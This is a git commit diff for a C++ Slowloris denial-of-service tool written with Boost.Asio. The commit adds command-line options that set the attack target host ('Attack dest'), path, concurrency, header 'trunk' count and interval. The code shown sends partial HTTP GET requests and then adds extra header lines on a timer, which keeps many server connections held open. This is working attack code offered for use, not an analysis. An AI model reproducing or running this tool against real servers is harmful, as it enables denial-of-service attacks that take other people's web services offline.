21aeeae5997a6949d518c3661827904450193804
Yuzo <hyzgog@gmail.com>
2015-01-02 00:23:53 +0800

    add program options

--- slowloris/slowloris.cpp
+++ slowloris/slowloris.cpp
@@ -3,16 +3,15 @@
 #include <boost/asio.hpp>
 #include <boost/bind.hpp>
 #include <boost/format.hpp>
+#include <boost/program_options.hpp>
 
 using namespace std;
 using namespace boost;
 using namespace asio;
+namespace po = boost::program_options;
 
-int concurrency = 100;
-int maxTrunk = 10;
-int interval = 5;
-string host = "localhost";
-string path = "/";
+int concurrency, trunks, interval;
+string host, path;
 
 class Request {
 public:
@@ -33,11 +32,13 @@ public:
 	void open() {
 		cout << format("Open Request: %1%") % id << endl;
 
-		*stream << format("GET %1% HTTP/1.1\r\n"
-				  "Host: %2%\r\n"
-				  "User-Agent: Boost.Asio\r\n"
-				  "Accept: */*\r\n"
-				  "Connection: Keep-Alive\r\n") % path % host;
+		*stream << format(
+			"GET %1% HTTP/1.1\r\n"
+			"Host: %2%\r\n"
+			"User-Agent: Boost.Asio\r\n"
+			"Accept: */*\r\n"
+			"Connection: Keep-Alive\r\n"
+		) % path % host;
 
 		stream->flush();
 		timer->expires_from_now(posix_time::seconds(interval));
@@ -49,7 +50,7 @@ public:
 		*stream << format("X-Trunk: %1%\r\n") % count;
 		stream->flush();
 
-		if (count < maxTrunk) {
+		if (count < trunks) {
 			count++;
 			timer->expires_from_now(posix_time::seconds(interval));
 			timer->async_wait(bind(&Request::append, this));
@@ -84,10 +85,41 @@ void createRequest(io_service* io, deadline_timer* timer, int id) {
 }
 
 int main(int argc, char *argv[]) {
+	po::options_description desc("Options");
+	desc.add_options()
+		("dest,d", po::value<string>()->default_value("localhost"), "Attack dest")
+		("path,p", po::value<string>()->default_value("/"), "Attack path")
+		("concurrency,c", po::value<int>()->default_value(20), "Concurrency requests")
+		("trunks,t", po::value<int>()->default_value(10), "Trunks count")
+		("interval,i", po::value<int>()->default_value(5), "Interval between trunks")
+		("help,h", "Show this help info");
+
+	po::variables_map vm;
+
+	try{
+		po::store(po::parse_command_line(argc, argv, desc), vm);
+		if (vm.count("help")) {
+			cout << desc << endl;
+			return 1;
+		}
+		po::notify(vm);
+
+		host = vm["dest"].as<string>();
+		path = vm["path"].as<string>();
+		concurrency = vm["concurrency"].as<int>();
+		trunks = vm["trunks"].as<int>();
+		interval = vm["interval"].as<int>();
+	} catch(po::error& e) {
+		cerr << "Error: " << e.what() << endl << endl;
+		cout << desc << endl;
+		return -1;
+	}
+
 	io_service io;
 	deadline_timer timer(io, posix_time::millisec(100));
 	timer.async_wait(bind(createRequest, &io, &timer, 0));
 
 	io.run();
+
 	return 0;
 }
